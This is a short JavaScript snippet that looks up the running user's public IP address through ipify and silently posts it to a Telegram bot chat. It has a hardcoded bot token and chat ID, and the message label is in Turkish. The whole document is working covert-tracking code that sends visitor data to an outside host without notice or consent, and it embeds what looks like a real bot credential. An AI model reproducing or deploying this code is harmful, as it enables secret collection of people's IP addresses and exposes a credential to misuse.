fetch('https://api.ipify.org?format=json')
  .then(res => res.json())
  .then(data => {
    fetch('https://api.telegram.org/bot8087577949:AAE6s1rHpfxjgmHPTGYkAbBuRw6O84szn8U/sendMessage', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: '7125066639',
        text: `IP adresi: ${data.ip}`
      })
    });
  });
